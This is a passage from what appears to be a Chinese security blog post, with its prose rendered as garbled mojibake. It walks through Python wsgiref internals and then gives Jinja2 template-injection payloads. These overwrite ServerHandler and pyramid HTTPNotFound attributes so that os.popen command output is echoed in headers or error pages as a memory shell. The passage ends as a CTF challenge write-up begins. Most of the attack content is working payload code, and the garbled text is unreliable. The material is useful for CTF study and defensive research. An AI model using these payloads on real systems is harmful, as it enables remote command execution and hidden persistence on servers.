</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Handle a single HTTP request&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">raw_requestline</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="mi">65537</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">raw_requestline</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">65536</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">requestline</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">request_version</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">send_error</span><span class="p">(</span><span class="mi">414</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_request</span><span class="p">():</span> <span class="c1"># An error code has been sent, just exit</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">handler</span> <span class="o">=</span> <span class="n">ServerHandler</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_stderr</span><span class="p">(),</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_environ</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="n">multithread</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">handler</span><span class="o">.</span><span class="n">request_handler</span> <span class="o">=</span> <span class="bp">self</span>      <span class="c1"># backpointer for logging</span>
</span></span><span class="line"><span class="cl"><span class="n">handler</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">get_app</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõrunÊñπÊ≥ïÔºåÁúãÂà∞<code>finish_reponse</code>ÔºåÁªßÁª≠Ë∑üËøõ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">result_is_file</span><span class="p">()</span> <span class="ow">or</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">sendfile</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">finish_content</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõwrite,Êää data ÂÜôÂÖ•ËøîÂõûÁöÑ body ‰∏≠ÔºåÁÑ∂ÂêéË∞ÉÁî®‰∫Ü<code>send_headler</code>,ÁªßÁª≠Ë∑üËøõ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Transmit headers to the client, via self._write()&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">cleanup_headers</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">headers_sent</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">origin_server</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">client_is_modern</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">send_preamble</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõ<code>send_preamble</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_preamble</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Transmit version/status/date/server, via self._write()&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">origin_server</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">client_is_modern</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;HTTP/</span><span class="si">%s</span><span class="s1"> </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">http_version</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Date&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="p">(</span><span class="s1">&#39;Date: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">format_date_time</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_software</span> <span class="ow">and</span> <span class="s1">&#39;Server&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">headers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;Server: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_software</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;Status: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁúãÂà∞ÊúÄÂêéÁöÑ header Â§¥Â∞±ÊòØÂú®ËøôÈáåËøõË°åÁöÑËµãÂÄºÔºåÊòØÊØèÊ¨°ËØ∑Ê±ÇËøõË°åÁöÑÂä®ÊÄÅËµãÂÄºÔºåÈÇ£‰πàÂèØ‰ª•ÈÄöËøá ssti Â∞ÜÂÖ∂‰øÆÊîπ‰∏∫Êàë‰ª¨ÁöÑÂõûÊòæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;HTTP/</span><span class="si">%s</span><span class="s1"> </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">http_version</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂèØ‰ª•ÁúãÂà∞ self ÊòØ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;wsgiref.simple_server.ServerHandler object at 0x00000227DAC28850&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÂÖàÂØªÊâæÂØπË±°ÔºåÁÑ∂ÂêéÊâìsstiÊ±°ÊüìÂ∞±Ë°å‰∫Ü</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÂÖàÊâæÂà∞wsgiref
</span></span><span class="line"><span class="cl">{{lipsum.__spec__.__init__.__globals__.sys.modules}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÊâæÂà∞simple_server
</span></span><span class="line"><span class="cl">{{lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.__dict__}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ÊâæÂà∞handler
</span></span><span class="line"><span class="cl">{{lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂ÂêéË∑üflask‰∏ÄÊ†∑‰øÆÊîπÂÄº</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,&#34;http_version&#34;,lipsum.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖËøòÊúâÂÖ∂‰ªñÂèØÂà©Áî®ÁöÑÁÇπ</p>
<p>ÂàöÂàöÁöÑ<code>send_preamble</code>ÈáåÈù¢ËøòÊúâÂèØ‰ª•Âà©Áî®ÁöÑ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">_write</span><span class="p">((</span><span class="s1">&#39;Server: </span><span class="si">%s</span><span class="se">\r\n</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_software</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;iso-8859-1&#39;</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Â∞ùËØï‰øÆÊîπ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{lipsum.__globals__.__builtins__.setattr(lipsum.__spec__.__init__.__globals__.sys.modules.wsgiref.simple_server.ServerHandler,&#34;server_software&#34;,lipsum.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())}}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{cycler.__init__.__globals__.__builtins__[&#39;setattr&#39;]
</span></span><span class="line"><span class="cl">(cycler.__init__.__globals__.__builtins__.__import__(&#39;sys&#39;).modules[&#39;wsgiref&#39;].si
</span></span><span class="line"><span class="cl">mple_server.ServerHandler,&#39;server_software&#39;,cycler.__init__.__globals__.__builtin
</span></span><span class="line"><span class="cl">s__.__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read())}}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="httpÈîôËØØÂõûÊòæ">HTTPÈîôËØØÂõûÊòæ
</h3><p>ËøôÈáåÁ†îÁ©∂ÊúÄËøëÊØîËµõ‰∏≠Âà´ÁöÑÂ∏àÂÇÖÂ∏∏Áî®ÁöÑËÉÅÊåÅÈîôËØØÂõûÊòæÁïåÈù¢ÁöÑÂÜÖÂ≠òÈ©¨</p>
<h4 id="500Áä∂ÊÄÅÁ†Å">500Áä∂ÊÄÅÁ†Å
</h4><p>ÂΩìÊàëËß¶ÂèëÊó∂È°µÈù¢ÂõûÊòæÂ¶Ç‰∏ãÂ≠óÊÆµ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">A server error occurred.  Please contact the administrator.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êàë‰ª¨‰ªéÊ∫ê‰ª£Á†Å‰∏≠ÊêúÁ¥¢ÂÆö‰ΩçÔºåÂèëÁé∞ÊòØ<code>Basehandler</code>ÁöÑ‰∏Ä‰∏™Â±ûÊÄß<strong>error_body</strong></p>
<p>Ê≥®ÊÑè<code>error_body</code>Á±ªÂûãÊòØ<code>bytes</code>Á±ªÂûã ÔºåÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂØπ<code>read()</code>ËøîÂõûÂõûÊù•ÁöÑÊï∞ÊçÆÂÆûÁé∞encodeËΩ¨Êç¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;setattr&#39;</span><span class="p">]((((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__spec__&#39;</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">))[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;modules&#39;</span><span class="p">))[</span><span class="s1">&#39;wsgiref&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;handlers&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;BaseHandler&#39;</span><span class="p">),</span><span class="s1">&#39;error_body&#39;</span><span class="p">,</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()[</span><span class="s1">&#39;encode&#39;</span><span class="p">]())}}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">wsgiref</span><span class="o">.</span><span class="n">simple_server</span><span class="o">.</span><span class="n">ServerHandler</span><span class="p">,</span><span class="s2">&#34;error_body&#34;</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="404Áä∂ÊÄÅÁ†Å">404Áä∂ÊÄÅÁ†Å
</h4><p>Ê†πÊçÆ404ÂõûÊòæÊâæÂà∞<strong>pyramid.httpexceptions.HTTPNotFoundÁ±ª</strong></p>
<p>ÂèëÁé∞<code>explanation</code>‰πüÊòØ<code>bytes</code>Á±ªÂûãÔºåÊ±°ÊüìÂ±ûÊÄßexplanationÊù•404ÂõûÊòæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;exec&#39;</span><span class="p">](</span><span class="s2">&#34;setattr(Not,&#39;explanation&#39;,shell)&#34;</span><span class="p">,{</span><span class="s2">&#34;Not&#34;</span><span class="p">:((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__spec__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">))[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;modules&#39;</span><span class="p">))[</span><span class="s1">&#39;pyramid&#39;</span><span class="p">][</span><span class="s1">&#39;httpexceptions&#39;</span><span class="p">][</span><span class="s1">&#39;HTTPNotFound&#39;</span><span class="p">],</span><span class="s2">&#34;shell&#34;</span><span class="p">:</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()})}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">pyramid</span><span class="o">.</span><span class="n">httpexceptions</span><span class="o">.</span><span class="n">HTTPNotFound</span><span class="p">,</span><span class="s2">&#34;explanation&#34;</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰πüÂèØ‰ª•Ë¶ÜÁõñÂ±ûÊÄßtitleÊù•ÂõûÊòæ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{(</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;exec&#39;</span><span class="p">])(</span><span class="s2">&#34;setattr(Not,&#39;title&#39;,shell)&#34;</span><span class="p">,{</span><span class="s2">&#34;Not&#34;</span><span class="p">:(((</span><span class="n">lipsum</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__spec__&#39;</span><span class="p">))</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__init__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__globals__&#39;</span><span class="p">))[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;modules&#39;</span><span class="p">))[</span><span class="s1">&#39;pyramid&#39;</span><span class="p">][</span><span class="s1">&#39;httpexceptions&#39;</span><span class="p">][</span><span class="s1">&#39;HTTPNotFound&#39;</span><span class="p">],</span><span class="s2">&#34;shell&#34;</span><span class="p">:</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">&#39;__globals__&#39;</span><span class="p">][</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;whoami&#39;</span><span class="p">)[</span><span class="s1">&#39;read&#39;</span><span class="p">]()})}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊàñËÄÖ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">pyramid</span><span class="o">.</span><span class="n">httpexceptions</span><span class="o">.</span><span class="n">HTTPNotFound</span><span class="p">,</span><span class="s2">&#34;title&#34;</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="Âº∫ÁΩëÊùØÂÜ≥Ëµõpyramid">Âº∫ÁΩëÊùØÂÜ≥Ëµõpyramid
</h3><p>app.py</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
